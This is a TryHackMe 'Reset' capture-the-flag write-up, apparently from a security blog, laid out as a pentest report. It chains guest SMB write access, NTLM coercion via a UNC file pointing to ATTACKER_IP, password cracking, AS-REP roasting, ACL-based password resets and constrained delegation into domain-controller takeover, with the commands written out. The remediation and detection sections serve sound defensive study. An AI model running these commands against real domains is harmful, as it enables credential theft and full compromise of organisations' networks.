---
title: "TryHackMe: Reset"
date: 2026-06-21 23:50:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - smb
  - ntlm
  - winrm
  - as-rep-roasting
  - bloodhound
  - acl-abuse
  - kerberos
  - constrained-delegation
  - privilege-escalation
description: >-
  Reset chains guest-writable SMB access, NTLM credential coercion, a weak
  automation credential, AS-REP roasting, excessive Active Directory ACLs,
  and constrained delegation into full domain-controller compromise.
author: lenovolegion7
media_subpath: /images/tryhackme_reset
image:
  path: room_image.webp
  alt: "Original TryHackMe Reset room artwork"
toc: true
comments: false
---

Reset is an Active Directory challenge built around insecure onboarding, credential exposure, delegated directory permissions, and Kerberos delegation. The validated path began with unauthenticated Guest access to a writable SMB share and ended with Administrator command execution on the domain controller.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Reset room card](room_card.webp){: w="299" h="273" .shadow }](https://tryhackme.com/room/resetui){: .center }

## Executive Summary

The target exposed the service profile of a Windows Active Directory domain controller. The domain was `thm.corp`, and the assessed host was `HAYSTACK.THM.CORP`.

The validated compromise path was:

1. discover DNS, Kerberos, LDAP, SMB, RDP, WinRM, and Active Directory Web Services;
2. access the `Data` SMB share as Guest with read/write permissions;
3. obtain onboarding information and identify the `AUTOMATE` account;
4. place a controlled UNC-referencing file in the writable onboarding directory;
5. capture `AUTOMATE` NetNTLMv2 challenge-response material;
6. recover the weak `AUTOMATE` password offline and obtain WinRM access;
7. identify Kerberos accounts with preauthentication disabled and compromise `TABATHA_BRITT` through AS-REP roasting;
8. follow an Active Directory ACL-control path through `SHAWNA_BRAY`, `CRUZ_HALL`, and `DARLA_WINTERS`;
9. use `DARLA_WINTERS` constrained delegation to request a CIFS ticket while impersonating Administrator;
10. execute commands as `THM\Administrator` on `HAYSTACK` and retrieve the final authorized objective.

> **Result:** An unauthenticated network position was converted into full Administrator access on the domain controller through a writable Guest share, credential coercion, weak passwords, excessive directory permissions, and Kerberos constrained delegation.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe laboratory target.

The work was time-boxed to the single assigned Active Directory environment. No destructive persistence, denial of service, broad password spraying, or testing outside the challenge target was performed.

The source report also records that unavailable ADCS and failed RBCD paths were not treated as exploitable findings.

## Initial Enumeration

The domain controller exposed the following principal services:

```console
$ nmap \
  -p53,88,389,636,445,3389,5985,9389 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed attack surface:

```text
53/tcp     DNS        authoritative for thm.corp
88/tcp     Kerberos   Microsoft Kerberos
389/636    LDAP       Active Directory LDAP / LDAPS
445/tcp    SMB        SMB 3.1.1; signing required
3389/tcp   RDP        Windows Server 2019 build 17763
5985/tcp   WinRM      WSMan / Microsoft HTTPAPI
9389/tcp   ADWS       Active Directory Web Services
```

LDAP and RDP metadata disclosed the domain and host naming required for subsequent Kerberos and directory operations.

## Guest SMB Access and Onboarding Disclosure

Guest access to the `Data` share exposed an onboarding directory with both read and write permissions:

```console
$ nxc smb TARGET_IP \
  -u guest \
  -p '' \
  --shares
```

Relevant result:

```text
Data    READ,WRITE
```

The onboarding material disclosed an organization-wide initial password and demonstrated the username format. The password itself is intentionally redacted:

```text
Initial onboarding password: [REDACTED]
Example employee: LILY_ONEILL
```

RID enumeration also disclosed the domain user population, including:

```text
THM\AUTOMATE
```

The key issue was not only disclosure. Because the onboarding directory was writable and processed by an automation account, unauthenticated users could influence a privileged workflow.

## NTLM Credential Coercion

A controlled SCF/URL-style file referencing an attacker-controlled UNC resource was placed in the writable onboarding directory.

The path is represented without publishing lab addresses:

```text
\\ATTACKER_IP\share\icon.ico
```

When the automation workflow enumerated the uploaded file, Windows attempted SMB authentication to the tester-controlled listener. Responder captured repeated NetNTLMv2 challenge-response material for:

```text
THM\AUTOMATE
```

The response material is not published:

```text
THM\AUTOMATE::THM:[REDACTED]
```

This converted anonymous SMB write access into offline-crackable credential material for a domain account with remote-management access.

## AUTOMATE WinRM Foothold

The captured NetNTLMv2 material was processed offline:

```console
$ john \
  --format=netntlmv2 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  automate-hashes.txt
```

A valid plaintext credential was recovered, but it is intentionally redacted:

```text
THM\AUTOMATE : [REDACTED]
```

The credential authenticated to WinRM:

```console
$ nxc winrm TARGET_IP \
  -d THM \
  -u AUTOMATE \
  -p [REDACTED]
```

An interactive session could then be established through Evil-WinRM.

The user-level objective was located at:

```text
C:\Users\automate\Desktop\user.txt
```

Its value is published only as:

```text
THM{[REDACTED]}
```

## AS-REP Roasting

Authenticated Kerberos enumeration identified three accounts with preauthentication disabled:

```text
ERNESTO_SILVA
TABATHA_BRITT
LEANN_LONG
```

AS-REP material was requested using the authenticated foothold:

```console
$ impacket-GetNPUsers \
  thm.corp/AUTOMATE:[REDACTED] \
  -dc-ip TARGET_IP \
  -request
```

Offline cracking recovered the password for:

```text
THM\TABATHA_BRITT : [REDACTED]
```

The recovered credential became the starting principal for the directory ACL takeover chain.

## Active Directory ACL Lateral Movement

BloodHound analysis identified a transitive control path across domain user objects:

```text
TABATHA_BRITT
    |
    | GenericAll
    v
SHAWNA_BRAY
    |
    | ForceChangePassword
    v
CRUZ_HALL
    |
    | GenericWrite
    v
DARLA_WINTERS
```

The permissions allowed controlled password changes without knowing the existing passwords.

Representative reset flow:

```console
$ net rpc password SHAWNA_BRAY [REDACTED] \
  -U 'THM/TABATHA_BRITT%[REDACTED]' \
  -S TARGET_IP

$ net rpc password CRUZ_HALL [REDACTED] \
  -U 'THM/SHAWNA_BRAY%[REDACTED]' \
  -S TARGET_IP

$ net rpc password DARLA_WINTERS [REDACTED] \
  -U 'THM/CRUZ_HALL%[REDACTED]' \
  -S TARGET_IP
```

This chain converted one crackable AS-REP credential into control of the delegation-enabled `DARLA_WINTERS` account.

## Constrained Delegation and Administrator Impersonation

`DARLA_WINTERS` was configured for Kerberos constrained delegation to:

```text
cifs/HAYSTACK.THM.CORP
```

After taking control of the account, an S4U request was used to obtain a CIFS service ticket while impersonating Administrator:

```console
$ impacket-getST \
  -dc-ip TARGET_IP \
  -spn cifs/HAYSTACK.THM.CORP \
  -impersonate Administrator \
  'THM.CORP/DARLA_WINTERS:[REDACTED]'
```

The resulting Kerberos ticket material is intentionally redacted.

The ticket was then used for Kerberos-authenticated command execution:

```console
$ impacket-wmiexec \
  -k \
  -no-pass \
  -dc-ip TARGET_IP \
  -target-ip TARGET_IP \
  'THM.CORP/Administrator@HAYSTACK.THM.CORP'
```

The final validated identity was:

```text
THM\Administrator
```

The final proof file was located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

Its value is redacted:

```text
THM{[REDACTED]}
```

## MachineAccountQuota Observation

The domain retained the default-style ability for authenticated users to create computer objects:

```text
ms-DS-MachineAccountQuota = 10
```

The assessment confirmed that the `AUTOMATE` user could create a test computer object. However, modification of RBCD on `HAYSTACK` was denied, so that path was not reported as a successful privilege-escalation route.

This remains a useful hardening finding because unnecessary user-created computer objects expand the available Active Directory attack surface.

## Findings

### F-01 - Guest-Writable Onboarding Share

- **Severity:** Critical
- **Affected asset:** `\\HAYSTACK\Data\onboarding`
- **Authentication:** Guest / blank password
- **Impact:** Unauthenticated read/write access and arbitrary file introduction

The Guest-accessible share exposed internal onboarding material and allowed files to be introduced into a directory processed by an automation account. This directly enabled the credential-coercion stage.

**Remediation:**

- remove Guest and anonymous share access;
- grant write access only to a dedicated minimally privileged service identity and approved administrators;
- separate inbound drop locations from privileged automation workflows;
- monitor new SCF, URL, LNK, `library-ms`, and similar UNC-referencing files.

### F-02 - Default Credential Disclosed in Onboarding Material

- **Severity:** High
- **Affected data:** onboarding PDFs and plaintext welcome material
- **Impact:** predictable initial credential exposure and password-reuse risk

The onboarding documents exposed an organization-wide initial password and revealed the username format.

**Remediation:**

- generate unique random one-time enrollment secrets;
- distribute activation secrets over a separate secure channel;
- require immediate credential change and MFA enrollment;
- remove passwords from documents and shared storage;
- rotate all previously exposed values.

### F-03 - Writable Share Enabled NTLM Credential Coercion

- **Severity:** Critical
- **Affected workflow:** onboarding automation
- **Coerced account:** `THM\AUTOMATE`
- **Impact:** NetNTLMv2 credential material captured from an automation account

The writable directory allowed UNC-referencing metadata to trigger outbound SMB authentication when processed automatically.

**Remediation:**

- block outbound SMB from servers to untrusted networks;
- reduce or disable NTLM where feasible;
- harden service identities against attacker-controlled metadata;
- validate file types and process untrusted uploads in isolated environments without reusable network credentials.

### F-04 - Weak AUTOMATE Password Enabled Offline Cracking

- **Severity:** High
- **Compromised account:** `THM\AUTOMATE`
- **Impact:** SMB, LDAP, RDP, and WinRM access after offline cracking

The captured NetNTLMv2 response was protected by a weak password recoverable with a common wordlist.

**Remediation:**

- migrate the service identity to a long random credential or gMSA;
- remove interactive WinRM/RDP rights from automation accounts unless explicitly required;
- enforce banned-password and strong minimum-length policies;
- alert on service-account interactive logons.

### F-05 - Kerberos Preauthentication Disabled

- **Severity:** High
- **Affected users:** `ERNESTO_SILVA`, `TABATHA_BRITT`, `LEANN_LONG`
- **Technique:** AS-REP roasting
- **Impact:** offline recovery of `TABATHA_BRITT` credentials

Accounts with `UF_DONT_REQUIRE_PREAUTH` allowed encrypted AS-REP material to be requested and attacked offline.

**Remediation:**

- enable Kerberos preauthentication for normal user and service accounts;
- continuously audit `UF_DONT_REQUIRE_PREAUTH`;
- use long random credentials or gMSAs for service identities;
- monitor unusual AS-REQ activity and bulk no-preauth requests.

### F-06 - Excessive Delegated Active Directory Object Permissions

- **Severity:** Critical
- **Chain:** `TABATHA_BRITT → SHAWNA_BRAY → CRUZ_HALL → DARLA_WINTERS`
- **Rights:** `GenericAll`, `ForceChangePassword`, `GenericWrite`
- **Impact:** chained account takeover

The ACL path allowed the attacker to progress across accounts without knowledge of their previous passwords.

**Remediation:**

- remove unnecessary `GenericAll`, `GenericWrite`, `AllExtendedRights`, and `ForceChangePassword` ACEs;
- delegate password-management rights through tightly scoped administrative groups;
- perform recurring BloodHound and ACL reviews;
- alert on high-risk directory-permission changes;
- rotate credentials for all affected accounts.

### F-07 - Constrained Delegation Enabled Administrator Impersonation

- **Severity:** Critical
- **Delegated account:** `THM\DARLA_WINTERS`
- **Delegated service:** `cifs/HAYSTACK.THM.CORP`
- **Impersonated user:** `THM\Administrator`
- **Impact:** Administrator shell on the domain controller

Control of the delegation-enabled account allowed S4U2Self/S4U2Proxy to obtain a CIFS ticket for Administrator and execute commands on `HAYSTACK`.

**Remediation:**

- remove constrained delegation where it is not a documented requirement;
- tightly control delegation relationships and service-account ACLs;
- mark privileged identities as sensitive and not delegable where compatible;
- add privileged users to Protected Users where appropriate;
- migrate service identities to dedicated gMSAs;
- monitor S4U activity and unusual privileged CIFS tickets.

### F-08 - MachineAccountQuota Permitted User-Created Computers

- **Severity:** Medium
- **Setting:** `ms-DS-MachineAccountQuota = 10`
- **Impact:** expanded Active Directory attack surface

A standard authenticated user was able to create a computer object. The tested RBCD modification on `HAYSTACK` was denied, so this capability was not part of the successful compromise path.

**Remediation:**

- set `ms-DS-MachineAccountQuota` to `0` unless user-driven domain joins are required;
- delegate computer creation to a controlled group and approved OU;
- monitor unexpected computer creation, renames, SPN changes, and delegation attributes;
- review and remove nonstandard computer objects.

## Security Impact

The validated chain resulted in complete administrative compromise of the Active Directory domain controller.

An attacker with equivalent network access could:

- read and modify unauthenticated onboarding content;
- coerce service-account NTLM authentication;
- recover weak credentials offline;
- obtain interactive WinRM access;
- enumerate Active Directory from an authenticated foothold;
- recover passwords through AS-REP roasting;
- take over users through excessive directory ACLs;
- impersonate Administrator through Kerberos constrained delegation;
- execute commands with administrative authority on the domain controller;
- access data and security controls available to the domain-controller Administrator.

The compromise did not depend on one isolated software exploit. It resulted from multiple identity, delegation, credential, and workflow weaknesses that formed a complete attack path.

## Detection Opportunities

Useful monitoring controls include:

- alert on Guest or anonymous writes to SMB shares;
- monitor creation of SCF, URL, LNK, and other UNC-referencing files in operational shares;
- alert on outbound SMB from domain controllers and automation servers to untrusted networks;
- monitor NetNTLMv2 authentication to unexpected destinations;
- detect interactive WinRM/RDP logons by automation accounts;
- monitor AS-REP requests for accounts without Kerberos preauthentication;
- alert on password resets and directory-object changes initiated by unusual principals;
- monitor changes to high-risk Active Directory ACEs;
- monitor S4U2Self/S4U2Proxy requests involving privileged users;
- alert on privileged CIFS service tickets issued through delegated accounts;
- monitor unexpected computer-object creation and delegation-attribute changes.

## Remediation Priorities

1. Remove Guest access and write permissions from the onboarding share.
2. Delete unauthorized files and redesign the automation workflow so untrusted files cannot trigger authenticated network access.
3. Rotate `AUTOMATE` and all accounts involved in the ACL takeover chain.
4. Replace service-account passwords with managed, high-entropy credentials or gMSAs.
5. Enable Kerberos preauthentication for all affected accounts.
6. Remove dangerous `GenericAll`, `GenericWrite`, and password-reset delegation paths.
7. Review and remove unnecessary constrained delegation.
8. Mark privileged accounts as non-delegable where operationally possible.
9. Block unnecessary outbound SMB and reduce NTLM exposure.
10. Set `ms-DS-MachineAccountQuota` to `0` unless explicitly required.
11. Deploy recurring BloodHound/ACL reviews and Kerberos/NTLM telemetry.
12. Scan shared storage and onboarding material for exposed credentials.

## Retest Plan

1. Verify Guest and anonymous users cannot read or write the onboarding share.
2. Confirm onboarding material no longer contains reusable passwords.
3. Verify uploaded UNC-referencing files cannot trigger outbound authenticated SMB.
4. Confirm the previous `AUTOMATE` credential no longer authenticates and the account cannot log on interactively unless explicitly required.
5. Verify all normal users require Kerberos preauthentication.
6. Confirm `TABATHA_BRITT` can no longer control `SHAWNA_BRAY`.
7. Confirm `SHAWNA_BRAY` cannot force-change `CRUZ_HALL`.
8. Confirm `CRUZ_HALL` cannot modify or reset `DARLA_WINTERS`.
9. Verify `DARLA_WINTERS` can no longer impersonate privileged users through constrained delegation.
10. Confirm privileged users are protected against delegation where compatible.
11. Verify `ms-DS-MachineAccountQuota` reflects the approved domain-join model.
12. Confirm ordinary authenticated users cannot create unapproved computer objects.
13. Verify the previous compromise path no longer produces Administrator command execution on `HAYSTACK`.

## Lessons Learned

Reset demonstrates how an external compromise can emerge from ordinary Active Directory configuration and identity-management weaknesses rather than a single software vulnerability.

The initial Guest share exposed both information and a writable automation path. NTLM coercion transformed that workflow weakness into service-account credential material. Weak passwords then enabled a WinRM foothold and AS-REP compromise, while excessive directory ACLs provided deterministic lateral movement. Finally, constrained delegation converted control of one user into Administrator impersonation on the domain controller.

The strongest defensive response is therefore to treat SMB permissions, onboarding data, service identities, Kerberos account configuration, Active Directory ACLs, and delegation settings as one connected security boundary rather than unrelated configuration items.
